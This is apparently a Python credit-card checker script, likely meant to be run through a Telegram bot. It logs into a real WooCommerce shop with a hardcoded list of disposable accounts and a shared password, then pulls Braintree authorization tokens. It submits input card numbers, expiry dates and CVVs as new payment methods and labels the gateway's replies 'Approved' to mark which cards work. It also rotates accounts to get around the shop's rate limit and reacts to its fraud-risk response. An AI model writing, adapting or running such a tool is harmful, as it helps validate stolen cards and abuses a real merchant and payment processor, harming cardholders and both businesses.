import os,sys
import random
import telebot
import requests,random,time,string,base64
from bs4 import BeautifulSoup
import os,json
import base64
from telebot import types
import time,requests
from re import findall
import user_agent

import re

import requests
import re,json
import random
import time
import string
import base64
from bs4 import BeautifulSoup



import random
import string
import threading
import time

acc = None  # تعريف متغير global لتخزين قيمة acc

def generate_random_account():
    global acc  # تعيين acc كـ global داخل الدالة
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    acc = f"{name}{number}@gmail.com"  # تعيين قيمة لـ acc
    return acc

def generate_emails_periodically():
    while True:
        generate_random_account()
      #  print(acc)
        time.sleep(0.1)

# إنشاء موضوع لتشغيل الدالة
thread = threading.Thread(target=generate_emails_periodically)
thread.start()

# الآن يمكنك الوصول إلى قيمة acc من هنا


def Tele(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	try:
	    yy = ex[2] + ex[3]
	    if '2' in ex[3] or '1' in ex[3]:
	        yy = ex[2] + '7'
	    else:
	        pass
	except:
	    yy = ex[0] + ex[1]
	    if '2' in ex[1] or '1' in ex[1]:
	        yy = ex[0] + '7'
	    else:
	        pass
	print(c,mm,yy,cvc)
	user = user_agent.generate_user_agent()
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()





	try:
	    open("cok.txt", "r")
	except:
	    open("cok.txt", "w").close()

	with open("cok.txt", "r") as file:
	    first_line = file.readline().strip()

# تخزين آخر وقت تم فيه اختيار كل حساب
	last_used_times = {}

	while True:
	    lines = """aopzstu@hi2.in
xlwlwbrz@hi2.in
wkadykmy@hi2.in
fxfilzkg@hi2.in
ssyyxs@hi2.in
flyyzy@hi2.in
yztiktnu@hi2.in
tgvxjj@hi2.in
fprmgl@hi2.in
pjgnhskm@hi2.in
yorwbq@hi2.in
vyojxvn@hi2.in
kgofpm@hi2.in
akrvqub@hi2.in
oihiiyjx@hi2.in
itjyxf@hi2.in
sbwomimy@hi2.in
muoqi@hi2.in
qzykpe@hi2.in
edtenh@hi2.in
lkuctxq@hi2.in
nmdspv@hi2.in
vcpumxg@hi2.in
aiudqg@telegmail.com
fpubjn@telegmail.com
btlax@telegmail.com
xigdpidl@telegmail.com
idlslsf@telegmail.com
asozd@telegmail.com
ctxzf@hi2.in
habvt@telegmail.com
jbssxfk@telegmail.com
egfamht@hi2.in
bbqglo@hi2.in
kbjeata@hi2.in
ufwry@hi2.in
ilyifgz@hi2.in
uuxkrvob@hi2.in
ycojmc@hi2.in
rhbummaa@hi2.in"""
	    lines = lines.strip().split("\n")
	    random_line_number = random.randint(0, len(lines) - 1)
	    cookei = lines[random_line_number]

    # الحصول على الوقت الحالي
	    current_time = time.time()

    # التحقق مما إذا كان الحساب قد تم استخدامه مؤخرًا
	    if cookei in last_used_times:
	        time_since_last_use = current_time - last_used_times[cookei]
	        if time_since_last_use < 20:
	            continue  # تجاهل هذا الحساب واختيار حساب آخر

	    if cookei == first_line:
	        pass
	    else:
	        last_used_times[cookei] = current_time
	        break

	with open("cok.txt", "w") as file:
	    file.write(cookei)
	    print(cookei)


	heaf = {
'User-Agent': user,
}
	get = r.get("https://ifeat.org/my-account/", headers=heaf)


	headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

	data = {
    'login_username': cookei,
    'login_password': '123bmS1234',
    'login_remember': 'true',
    'login_submit': 'Sign In',
    'login_redirect': 'https://ifeat.org/my-account/',
    'login_form_id': '3',
    'pp_current_url': 'https://ifeat.org/my-account/',
    'login_referrer_page': '',
}

	response = r.post('https://ifeat.org/my-account/payment-methods/', headers=headers, data=data)

	heaf = {
'User-Agent': user,
}
	rrr = r.get("https://ifeat.org/my-account/add-payment-method/", headers=heaf)

	nonce = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', rrr.text)[0]
	client = re.search(r'client_token_nonce":"([^"]+)"', rrr.text).group(1)


	data = {
	'action': 'wc_braintree_credit_card_get_client_token',
	'nonce': client,
}

	response = r.post('https://ifeat.org/wp-admin/admin-ajax.php', headers=headers, data=data)




	enc = response.json()['data']
	 
	dec = base64.b64decode(enc).decode('utf-8')
	 
	auth=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]

	print(auth)
	print(nonce)







	headers = {
	'authority': 'payments.braintree-api.com',
	'accept': '*/*',
	'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	'authorization': f'Bearer {auth}',
	'braintree-version': '2018-05-10',
	'content-type': 'application/json',
	'origin': 'https://assets.braintreegateway.com',
	'referer': 'https://assets.braintreegateway.com/',
	'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	'sec-ch-ua-mobile': '?1',
	'sec-ch-ua-platform': '"Android"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'cross-site',
	'user-agent': user,
}

	json_data = {
	'clientSdkMetadata': {
	'source': 'client',
	'integration': 'custom',
	'sessionId': '31446d87-50b3-423b-a81f-6762e028d872',
	},
	'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {	 token	 creditCard {	   bin	   brandCode	   last4	   cardholderName	   expirationMonth	  expirationYear	  binData {	 prepaid	 healthcare	 debit	 durbinRegulated	 commercial	 payroll	 issuingBank	 countryOfIssuance	 productId	   }	 }   } }',
	'variables': {
	'input': {
		'creditCard': {
		'number': c,
		'expirationMonth': mm,
		'expirationYear': yy,
		'cvv': cvc,
		},
		'options': {
		'validate': False,
		},
	},
	},
	'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	print(tok)
	
	headers = {
'User-Agent': user,
}



	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'visa',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = r.post('https://ifeat.org/my-account/add-payment-method/', headers=headers, data=data)
	

	text = response.text
		
	pattern = r'Reason: (.+?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'added' in text or 'Payment method successfully added.' in text:
			result = "Approved ✅"
			return result
		else:
			try:
				result = text.split('Status code ')[1].split('<')[0]
			except:
				try:
					result = match
				except:
					result = 'Unknow Response'

	
	if 'risk_threshold' in result:
			return "RISK: Retry this BIN later."
	elif 'You cannot add a new payment method so soon after the previous one' in result:
		    return "Please wait for 20 seconds."
	elif 'Nice! New payment method added' in result or 'Payment method successfully added.' in result:
		    return 'Approved ✅'
	elif 'Duplicate card exists in the vault.' in result:
		    return 'Approved ✅! - Duplicate'
	elif "avs: Gateway Rejected: avs" in result or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in result or "cvv: Gateway Rejected: cvv" in result:
		    return 'Approved ✅! - AVS-CVV'
	elif "Invalid postal code" in result or "CVV." in result:
		    return 'Approved ✅! - Invalid postal code and cvv'
	elif "Card Issuer Declined CVV" in result:
		    return 'Approved ✅! - Declined CVV'
	elif not re.search(r'[A-Za-z]', result) and not re.search(r'[0-9]', result):
		    return 'Approved ✅!'
	else:
		return result
